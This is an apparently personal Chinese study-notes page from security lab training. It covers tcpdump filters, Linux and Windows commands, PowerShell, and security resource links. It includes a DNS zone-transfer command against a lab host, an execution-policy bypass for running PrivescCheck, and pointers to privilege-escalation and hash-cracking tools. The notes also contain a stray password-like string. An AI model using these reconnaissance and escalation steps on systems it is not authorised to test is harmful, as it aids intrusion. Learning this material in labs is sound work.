<h6 id="发送量大于15000字节的数据主机IP"><a href="#发送量大于15000字节的数据主机IP" class="headerlink" title="发送量大于15000字节的数据主机IP"></a>发送量大于15000字节的数据主机IP</h6><ul>
<li>tcpdump -nnr traffic.pcap “greater 15000”</li>
</ul>
<h6 id="发送arp请求的主机mac地址"><a href="#发送arp请求的主机mac地址" class="headerlink" title="发送arp请求的主机mac地址"></a>发送arp请求的主机mac地址</h6><ul>
<li>tcpdump -ennr traffic.pcap arp</li>
</ul>
<p><strong>tcp</strong></p>
<p>您可以使用tcp[tcpflags]来引用TCP标志字段。以下TCP标志可供比较：</p>
<p>tcp-syn TCP SYN（同步）<br>tcp-ack TCP ACK（确认）<br>tcp-fin TCP FIN（完成）<br>tcp-rst TCP RST（重置）<br>tcp-push TCP推送</p>
<p><strong>大小</strong></p>
<p>greater LENGTH：过滤长度大于或等于指定长度的数据包<br>less LENGTH：过滤长度小于或等于指定长度的数据包</p>
<h6 id=""><a href="#" class="headerlink" title=""></a></h6><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><ul>
<li>进程控制<ul>
<li>systemctl</li>
</ul>
</li>
<li>进入后台运行的进程<ul>
<li>fg</li>
</ul>
</li>
<li>进程管理<ul>
<li>SIGTERM——终止进程，但允许它事先做一些清理任务</li>
<li>SIGKILL-终止进程-事后不做任何清理</li>
<li>SIGSTOP——停止&#x2F;暂停进程</li>
<li>systemctl stop </li>
<li>systemctl enable</li>
</ul>
</li>
</ul>
<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ss tcp/ip连接</span><br><span class="line"></span><br><span class="line">telnet ip port  然后写数据包</span><br><span class="line"></span><br><span class="line">域名转移，-t AXFR表示我们正在请求区域传输</span><br><span class="line">dig -t AXFR redteam.thm @10.10.177.74</span><br></pre></td></tr></table></figure>

<ul>
<li>发行版本和更多信息<ul>
<li>ls &#x2F;etc&#x2F;*-release  然后再打开里面的</li>
</ul>
</li>
<li>系统名称<ul>
<li>hostname</li>
</ul>
</li>
<li>显示谁登录了<ul>
<li>who</li>
<li>w   谁登录了以及在做什么</li>
<li>id   打印真实有效的用户和组id</li>
<li>last   最近登录的用户列表</li>
</ul>
</li>
<li>网络信息<ul>
<li>ip a s （ip address show）</li>
<li>域名服务器<ul>
<li>cat &#x2F;etc&#x2F;resolv.conf</li>
</ul>
</li>
<li>netstat</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>-a</code></td>
<td>显示监听和非监听套接字</td>
</tr>
<tr>
<td><code>-l</code></td>
<td>仅显示监听套接字</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>显示数字输出而不是解析 IP 地址和端口号</td>
</tr>
<tr>
<td><code>-t</code></td>
<td>TCP</td>
</tr>
<tr>
<td><code>-u</code></td>
<td>UDP</td>
</tr>
<tr>
<td><code>-x</code></td>
<td>UNIX</td>
</tr>
<tr>
<td><code>-p</code></td>
<td>显示套接字所属程序的PID和名称</td>
</tr>
</tbody></table>
<ul>
<li>进程<ul>
<li>ps</li>
<li>ps auxf       f代表森林</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>-e</code></td>
<td>所有流程</td>
</tr>
<tr>
<td><code>-f</code></td>
<td>全格式列表</td>
</tr>
<tr>
<td><code>-j</code></td>
<td>作业格式</td>
</tr>
<tr>
<td><code>-l</code></td>
<td>长格式</td>
</tr>
<tr>
<td><code>-u</code></td>
<td>以用户为导向的格式</td>
</tr>
</tbody></table>
<ul>
<li>泄露敏感信息<ul>
<li>邮件目录<ul>
<li>&#x2F;var&#x2F;mail</li>
</ul>
</li>
<li>已安装的应用程序<ul>
<li>ls -lh &#x2F;user&#x2F;bin&#x2F;</li>
<li>ls -lh &#x2F;sbin&#x2F;</li>
</ul>
</li>
</ul>
</li>
<li>RPM（<strong>Red Hat Package Manager</strong>）是一种包管理系统<ul>
<li>rpm -qa               -qa表示要查询的所有软件包</li>
</ul>
</li>
<li><h2 id="debian-已安装软件包列表-dpkg-l"><a href="#debian-已安装软件包列表-dpkg-l" class="headerlink" title="debian- 已安装软件包列表  - dpkg -l"></a>debian<br>- 已安装软件包列表<br>  - dpkg -l</h2></li>
</ul>
<h3 id="更改默认shell"><a href="#更改默认shell" class="headerlink" title="更改默认shell"></a>更改默认shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsh临时更改，永久更改走下边</span><br><span class="line">chsh -s /usr/bin/zsh</span><br></pre></td></tr></table></figure>

<h4 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h4><ul>
<li>Zsh 提供了高级的制表符补全功能，还能够编写脚本</li>
<li>比其他 shell 慢</li>
<li>用插件语法高亮</li>
</ul>
<h4 id="FIsh"><a href="#FIsh" class="headerlink" title="FIsh"></a>FIsh</h4><ul>
<li>为命令提供自动拼写纠正。</li>
<li>带语法高亮</li>
</ul>
<h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><h4 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h4><p>每个脚本都应该有shebang</p>
<p>#!&#x2F;bin&#x2F;bash </p>
<h3 id="找端口服务"><a href="#找端口服务" class="headerlink" title="找端口服务"></a>找端口服务</h3><h4 id="根据端口"><a href="#根据端口" class="headerlink" title="根据端口"></a>根据端口</h4><p>sudo netstat -anop |grep :6667</p>
<h4 id="根据服务部分找全部"><a href="#根据服务部分找全部" class="headerlink" title="根据服务部分找全部"></a>根据服务部分找全部</h4><p>sudo ps afux | grep “THM”</p>
<h2 id="计时任务cron"><a href="#计时任务cron" class="headerlink" title="计时任务cron"></a>计时任务cron</h2><p>crontab -e 进行编辑，@reboot是重启就运行</p>
<p>分钟，小时，天。月，年</p>
<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><ul>
<li><strong>BitLocker</strong>：<ul>
<li>BitLocker是Windows Pro版本中提供的全磁盘加密工具，它允许用户加密整个硬盘驱动器，以保护数据不被未授权访问。Home版本不支持BitLocker。</li>
</ul>
</li>
<li>本地用户和组管理<ul>
<li>搜索other user</li>
<li>win+r lusrmgr.msc</li>
</ul>
</li>
<li>任务管理器快捷键<ul>
<li>Ctrl+Shift+Esc</li>
</ul>
</li>
<li>性能监视器<ul>
<li>perfmon</li>
</ul>
</li>
</ul>
<h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><ul>
<li>msconfig</li>
<li>一般的<br>引导<br>服务<br>启动   启动项，为空<br>工具，在这里about能看到版本信息</li>
</ul>
<h3 id="启动项管理"><a href="#启动项管理" class="headerlink" title="启动项管理"></a>启动项管理</h3><ul>
<li>taskmgr 任务管理器</li>
</ul>
<h3 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h3><p>（<strong>User Account Control</strong>，用户帐户控制）</p>
<h3 id="computer-manager"><a href="#computer-manager" class="headerlink" title="computer_manager"></a>computer_manager</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compmgmt.msc</span><br></pre></td></tr></table></figure>

<h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h5><h5 id="事件查看器"><a href="#事件查看器" class="headerlink" title="事件查看器"></a>事件查看器</h5><p>事件查看器有三个窗格。<br>左侧窗格提供了事件日志提供程序的层次树列表。（如上图所示）<br>中间的窗格将显示所选提供商特定事件的概述和摘要。<br>右侧的窗格是操作窗格。</p>
<h5 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h5><h5 id="设备管理"><a href="#设备管理" class="headerlink" title="设备管理"></a>设备管理</h5><h5 id="服务与应用"><a href="#服务与应用" class="headerlink" title="服务与应用"></a>服务与应用</h5><p>禁用启用查看服务</p>
<h5 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h5><p>磁盘分区扩容压缩</p>
<h3 id="system-infomation"><a href="#system-infomation" class="headerlink" title="system_infomation"></a>system_infomation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo32</span><br></pre></td></tr></table></figure>

<p>系统摘要中的信息分为三个部分：</p>
<p>硬件资源 hardware resources<br>成分 components<br>软件环境 software Environment</p>
<h3 id="资源监视器"><a href="#资源监视器" class="headerlink" title="资源监视器"></a>资源监视器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resmon</span><br></pre></td></tr></table></figure>

<h3 id="基础命令-1"><a href="#基础命令-1" class="headerlink" title="基础命令"></a>基础命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hostname	#输出计算机名称</span><br><span class="line">whoami	#输出登录用户的名称</span><br><span class="line">/？	#检索命令帮助手册</span><br><span class="line">cls	#清屏</span><br><span class="line">netstat	#查看tcp/ip网络连接</span><br><span class="line">查找端口运行的程序👇</span><br><span class="line">netstat -ano |findstr :3389</span><br><span class="line">根据进程查tasklist /FI &quot;PID eq 988&quot;</span><br><span class="line">netsh advfirewall firewall show rule name=all</span><br><span class="line">#防火墙端口开放详细</span><br></pre></td></tr></table></figure>

<p>查找flag</p>
<p>dir C:\flag.txt &#x2F;s &#x2F;p</p>
<h4 id="基础三龙"><a href="#基础三龙" class="headerlink" title="基础三龙"></a>基础三龙</h4><ul>
<li>查看端口tcp<ul>
<li>netstat -t</li>
</ul>
</li>
<li>根据端口查pid<ul>
<li>netstat -ano | findstr :22</li>
</ul>
</li>
<li>根据pid查服务<ul>
<li>tasklist &#x2F;FI “PID eq 2068”</li>
</ul>
</li>
</ul>
<h5 id="隐藏后缀打开"><a href="#隐藏后缀打开" class="headerlink" title="隐藏后缀打开"></a>隐藏后缀打开</h5><p>win+r</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 shell32.dll,Options_RunDLL 7</span><br></pre></td></tr></table></figure>

<h5 id="tasklist"><a href="#tasklist" class="headerlink" title="tasklist"></a>tasklist</h5><p>显示当前进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /FI &quot;imagename eq notepad.exe&quot;</span><br></pre></td></tr></table></figure>

<p>终止</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill /PID 1516</span><br></pre></td></tr></table></figure>

<h5 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h5><p>&#x2F;s关机</p>
<p>&#x2F;a取消关机</p>
<p>&#x2F;r重启</p>
<h4 id="cmd和powershell"><a href="#cmd和powershell" class="headerlink" title="cmd和powershell"></a>cmd和powershell</h4><p>传统工具（如<code>cmd.exe</code>批处理文件）在自动化和管理这些系统方面显得力不从心。</p>
<p>powershell的开发采用的高级方法<strong>object-oriented</strong></p>
<p>PowerShell命令称为<code>cmdlets</code>（发音为<code>command-lets</code>）</p>
<h5 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h5><h5 id="系统和网络"><a href="#系统和网络" class="headerlink" title="系统和网络"></a>系统和网络</h5><ol>
<li>Get-ComputerInfo<ul>
<li>systeminfo的升级版本</li>
</ul>
</li>
<li>Get-LocalUser<ul>
<li>列出本地账户</li>
</ul>
</li>
<li>Get-NetIPConfiguration<ul>
<li>列出网络接口的详细信息，IP地址，DNS服务器和网关配置</li>
</ul>
</li>
<li>Get-NetIPAddress<ul>
<li>IP地址详细信息</li>
</ul>
</li>
</ol>
<h5 id="实时系统分析"><a href="#实时系统分析" class="headerlink" title="实时系统分析"></a>实时系统分析</h5><p>当前进程详细图</p>
<ul>
<li><p>Get-Process</p>
<ul>
<li>进程详细图，cpu使用情况</li>
</ul>
</li>
<li><p>Get-Service</p>
<ul>
<li>机器上服务状态的信息</li>
</ul>
</li>
<li><p>Get-NetTCPConnection</p>
<ul>
<li>监测活动网络连接</li>
</ul>
</li>
<li><p>Get-FileHash -Path .\ship-flag.txt  </p>
<ul>
<li>获取文件hash</li>
</ul>
<p>OwningProcess</p>
</li>
</ul>
<hr>
<ul>
<li><code>Get-Content</code>：检索（获取）文件的内容并将其显示在控制台中。<ul>
<li>Get-Command -CommandType “Function”</li>
<li>Get-Help Get-Date -examples</li>
<li>Get-Alias<ul>
<li>取别名</li>
</ul>
</li>
</ul>
</li>
<li><code>Set-Location</code>：更改（设置）当前工作目录。</li>
</ul>
<p>查找和下载cmdlet</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Find-Module -Name &quot;PowerShell*&quot;     #模糊查找</span><br><span class="line">Install-Module -Name &quot;PowerShellGet&quot;</span><br></pre></td></tr></table></figure>

<h5 id="移动-查看"><a href="#移动-查看" class="headerlink" title="移动+查看"></a>移动+查看</h5><ol>
<li>移动到<ul>
<li>Set-Location -Path “.\Documents</li>
</ul>
</li>
<li>当前文件夹内容<ul>
<li>Get-ChildItem  ## -path xxx</li>
</ul>
</li>
<li>输出指定内容<ul>
<li>Get-ChildItem | Select-Object Name,Length</li>
</ul>
</li>
<li>根据大小排序<ul>
<li>Get-ChildItem | Sort-Object Length</li>
</ul>
</li>
<li>筛选#根据-财产 “属性”<ul>
<li>Get-ChildItem | Where-Object -Property “Extension” -eq “.txt”</li>
</ul>
</li>
<li>模糊匹配<ul>
<li>Get-ChildItem | Where-Object -Property “Name” -like “ship*”</li>
</ul>
</li>
<li>复制<ul>
<li>Copy-Item -Path xxx yyy</li>
</ul>
</li>
<li>打开<ul>
<li>Get-Content -Path “.\captain-hat.txt”</li>
</ul>
</li>
<li>显示最大文件<ul>
<li>Get-ChildItem | Sort-Object Length -Descending | Select-Object -First 1</li>
</ul>
</li>
<li>搜索字符串<ul>
<li>Select-String -Path “.\captain-hat.txt” -Pattern “hat”</li>
</ul>
</li>
<li>Get-ChildItem |Where-Object -Property “length” -gt 100<ul>
<li>检索当前目录中大小大于 100 的项目</li>
</ul>
</li>
</ol>
<h5 id="建立新项目-删除"><a href="#建立新项目-删除" class="headerlink" title="建立新项目+删除"></a>建立新项目+删除</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件夹</span><br><span class="line">New-Item -Path &quot;.\captain-cabin\captain-wardrobe&quot; -ItemType &quot;Directory&quot;</span><br><span class="line">文件</span><br><span class="line">New-Item -Path &quot;.\captain-cabin\captain-wardrobe\captain-boots.txt&quot; -ItemType &quot;File&quot;</span><br><span class="line">删除</span><br><span class="line">Remove-Item -Path &quot;.\captain-cabin\captain-wardrobe\captain-boots.txt&quot;</span><br></pre></td></tr></table></figure>

<h5 id="Where-object筛选"><a href="#Where-object筛选" class="headerlink" title="Where-object筛选"></a>Where-object筛选</h5><p>这里<code>Where-Object</code>根据文件的<code>Extension</code>属性进行过滤，确保只列出扩展名等于（ <code>-eq</code>）的文件。<code>.txt</code></p>
<p>运算符<code>-eq</code>（即“<strong>等于</strong>”）是与其他脚本语言（例如 Bash、Python）共享的一组<strong>比较运算符</strong>的一部分。为了展示 PowerShell 过滤的潜力，我们从该列表中选择了一些最有用的运算符：</p>
<ul>
<li><code>-ne</code>：“<strong>不等于</strong>”。此运算符可用于根据指定的条件从结果中排除对象。</li>
<li><code>-gt</code>：“<strong>大于</strong>”。此运算符将仅过滤超过指定值的对象。需要注意的是，这是一个严格的比较，这意味着等于指定值的对象将被排除在结果之外。</li>
<li><code>-ge</code>：“<strong>大于或等于</strong><code>-gt</code>”。这是上一个运算符的非严格版本。与的组合<code>-eq</code>。</li>
<li><code>-lt</code>：“<strong>小于</strong>”。与“大于”类似，这是一个严格运算符。它仅包含严格低于某个值的对象。</li>
<li><code>-le</code>：“<strong>小于或等于</strong>”。与 类似，这是前一个运算符的非严格版本。和<code>-ge</code>的组合。<code>-lt``-eq</code></li>
</ul>
<h4 id="CLI"><a href="#CLI" class="headerlink" title="CLI"></a>CLI</h4><p><strong>Command Line Interface</strong>（命令行界面）</p>
<h5 id="set"><a href="#set" class="headerlink" title="set"></a>set</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发出命令set来检查您的路径。下面的终端输出显示了 MS Windows 将执行命令的路径，如以 开头的行所示Path=。</span><br></pre></td></tr></table></figure>

<h5 id="ver"><a href="#ver" class="headerlink" title="ver"></a>ver</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ver命令来确定操作系统 ( OS ) 版本。</span><br></pre></td></tr></table></figure>

<h5 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">列出有关系统的各种信息，例如操作系统信息、系统详细信息、处理器和内存。</span><br></pre></td></tr></table></figure>

<h4 id="IP相关"><a href="#IP相关" class="headerlink" title="IP相关"></a>IP相关</h4><h5 id="tracert-example-com"><a href="#tracert-example-com" class="headerlink" title="tracert + example.com"></a>tracert + example.com</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出经过的路由器</span><br></pre></td></tr></table></figure>

<h5 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查找主机或域并返回其IP</span><br></pre></td></tr></table></figure>

<h5 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">显示当前监听的端口和网络连接</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-a</code>显示所有已建立的连接和监听端口</li>
<li><code>-b</code>显示与每个监听端口和已建立的连接关联的程序</li>
<li><code>-o</code>显示与连接关联的进程 ID ( PID )</li>
<li><code>-n</code>使用数字形式表示地址和端口号</li>
</ul>
<h5 id="-1"><a href="#-1" class="headerlink" title=""></a></h5><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regedit</span><br></pre></td></tr></table></figure>

<h3 id="Windows-更新"><a href="#Windows-更新" class="headerlink" title="Windows 更新"></a>Windows 更新</h3><p>更新通常在每个月的第二个星期二发布。这一天称为 </p>
<h5 id="补丁星期二。"><a href="#补丁星期二。" class="headerlink" title="补丁星期二。"></a><strong>补丁星期二</strong>。</h5><p>Windows 更新设置是“受管理的”。（通常，家庭用户不会看到此类消息）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CMD 运行命令 control /name Microsoft.WindowsUpdate</span><br></pre></td></tr></table></figure>

<h3 id="Windows安全"><a href="#Windows安全" class="headerlink" title="Windows安全"></a>Windows安全</h3><h5 id="打开防火墙"><a href="#打开防火墙" class="headerlink" title="打开防火墙"></a>打开防火墙</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WF.msc</span><br></pre></td></tr></table></figure>

<h5 id="浏览器访问保护"><a href="#浏览器访问保护" class="headerlink" title="浏览器访问保护"></a>浏览器访问保护</h5><p>根据微软的说法，“ Microsoft Defender SmartScreen 可防止网络钓鱼或恶意软件网站和应用程序以及潜在恶意文件的下载”。</p>
<h5 id="可信平台模块-TPM"><a href="#可信平台模块-TPM" class="headerlink" title="可信平台模块( TPM )"></a><strong>可信平台模块</strong>( <strong>TPM</strong> )</h5><p>Trusted Platform Module</p>
<p>内存完整性和cpu完整性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Core isolation</span><br><span class="line">Security processor</span><br></pre></td></tr></table></figure>

<h5 id="USB-startup-key"><a href="#USB-startup-key" class="headerlink" title="USB startup key"></a>USB startup key</h5><p>在没有TPM 版本 1.2 或更高版本的计算机上，用户必须插入</p>
<h5 id="vss（Volume-Shadow-Copy-Service"><a href="#vss（Volume-Shadow-Copy-Service" class="headerlink" title="vss（Volume Shadow Copy Service"></a>vss（Volume Shadow Copy Service</h5><h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>没用过都</p>
<ul>
<li><p>Sysinternals Suite</p>
<p>- </p>
<table>
<thead>
<tr>
<th>实用程序名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>进程浏览器</td>
<td>显示进程以及打开的文件和注册表项</td>
</tr>
<tr>
<td>进程监控</td>
<td>监控文件系统、进程和注册表</td>
</tr>
<tr>
<td>列表</td>
<td>提供有关流程的信息</td>
</tr>
<tr>
<td>登入</td>
<td>显示已登录的用户</td>
</tr>
</tbody></table>
</li>
<li><p>Process Hacker</p>
</li>
<li><p>GhostPack Seatbelt</p>
</li>
</ul>
<h1 id="信息搜集-资源"><a href="#信息搜集-资源" class="headerlink" title="信息搜集+资源"></a>信息搜集+资源</h1><h2 id="免费证书签名TLS"><a href="#免费证书签名TLS" class="headerlink" title="免费证书签名TLS"></a>免费证书签名TLS</h2><p><a target="_blank" rel="noopener" href="https://letsencrypt.org/">Let‘s Encrypt</a></p>
<p><a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04">创建自己的https网站</a></p>
<h2 id="主机信息搜集"><a href="#主机信息搜集" class="headerlink" title="主机信息搜集"></a>主机信息搜集</h2><p>fofa</p>
<p>Shodan</p>
<p>censys</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://search.censys.io/">https://search.censys.io/</a></li>
</ul>
<h2 id="威胁软件分析"><a href="#威胁软件分析" class="headerlink" title="威胁软件分析"></a>威胁软件分析</h2><p>微步云沙箱</p>
<p>virustotal</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/">https://blog.csdn.net/</a></p>
<p><a target="_blank" rel="noopener" href="https://sandbox.dbappsecurity.com.cn/">https://sandbox.dbappsecurity.com.cn/</a></p>
<h2 id="信息泄露自查"><a href="#信息泄露自查" class="headerlink" title="信息泄露自查"></a>信息泄露自查</h2><p>Have I Been Pwned</p>
<h2 id="cve查询"><a href="#cve查询" class="headerlink" title="cve查询"></a>cve查询</h2><p>exploit database</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li>
</ul>
<p>MITRE Corporation maintains the CVE system</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/">https://nvd.nist.gov/</a></li>
</ul>
<p>cve</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cve.org/">https://www.cve.org/</a></li>
</ul>
<p>不知道这是啥</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://packetstorm.news/">https://packetstorm.news/</a></li>
</ul>
<h2 id="国外网站"><a href="#国外网站" class="headerlink" title="国外网站"></a>国外网站</h2><p>LinkedIn</p>
<ul>
<li>搜集国外员工技术背景</li>
</ul>
<p>黑帽子</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.blackhat.com/">https://www.blackhat.com/</a></li>
</ul>
<p>wp</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://inventyourshit.com/">https://inventyourshit.com/</a></li>
</ul>
<p>在线解码hash</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a></li>
</ul>
<h3 id="资源金库"><a href="#资源金库" class="headerlink" title="资源金库"></a>资源金库</h3><p><a target="_blank" rel="noopener" href="https://attack.mitre.org/">https://attack.mitre.org/</a></p>
<p>其他信息库</p>
<p><a target="_blank" rel="noopener" href="https://malpedia.caad.fkie.fraunhofer.de/">https://malpedia.caad.fkie.fraunhofer.de/</a></p>
<h3 id="国外工具"><a href="#国外工具" class="headerlink" title="国外工具"></a>国外工具</h3><p>协助传输文件</p>
<ul>
<li>certutil</li>
</ul>
<p>挖掘监控短信流量</p>
<ul>
<li>MESSAGETAP</li>
</ul>
<h3 id="提权工具"><a href="#提权工具" class="headerlink" title="提权工具"></a>提权工具</h3><p>WES-NG：Windows 漏洞建议器 - 下一代</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></li>
<li>user@kali$ wes.py systeminfo.txt</li>
</ul>
<p>PrivescCheck</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">https://github.com/itm4n/PrivescCheck</a></p>
</li>
<li><p>PowerShell脚本，用于在目标系统上搜索常见的特权升级。它提供了一种 WinPEAS 的替代方案，无需执行二进制文件。</p>
</li>
<li><pre><code>PS C:\&gt; Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\&gt; . .\PrivescCheck.ps1
PS C:\&gt; Invoke-PrivescCheck
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">WinPEAS</span><br><span class="line"></span><br><span class="line">- https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS</span><br><span class="line">- WinPEAS 是一个脚本，用于枚举目标系统以发现特权提升路径。</span><br><span class="line">- winPEAS 的输出可能很长，有时难以阅读。这就是为什么始终将输出重定向到文件是个好习惯，</span><br><span class="line"></span><br><span class="line"># 域</span><br><span class="line"></span><br><span class="line">## 成员分配</span><br><span class="line"></span><br><span class="line">### 删除多余ou和用户</span><br><span class="line"></span><br><span class="line">高级功能-》右键属性object-》关闭保护，然后就能删了</span><br><span class="line"></span><br><span class="line">### 代表团</span><br><span class="line"></span><br><span class="line">Delegation</span><br><span class="line"></span><br><span class="line">权限的委托</span><br><span class="line"></span><br><span class="line">右键Delegation control，然后先添加，再检查姓名</span><br><span class="line"></span><br><span class="line">lipp123！</span><br><span class="line"></span><br><span class="line">### 机子区分</span><br><span class="line"></span><br><span class="line">#### PC</span><br><span class="line"></span><br><span class="line">- **Personal Computer**：个人计算机。通常指用于个人或家庭使用的计算机，如台式机和笔记本电脑。PC 通常用于日常办公、娱乐、学习等任务。</span><br><span class="line"></span><br><span class="line">#### LPT</span><br><span class="line"></span><br><span class="line">- **Line Printer Terminal**：行式打印机终端。在早期的计算机系统中，LPT 通常指连接到计算机的并行打印机接口。LPT 端口用于将数据从计算机传输到打印机。现代计算机中，LPT 端口已被 USB 等更先进的接口所取代。</span><br><span class="line"></span><br><span class="line">#### SRV 和 SVR</span><br><span 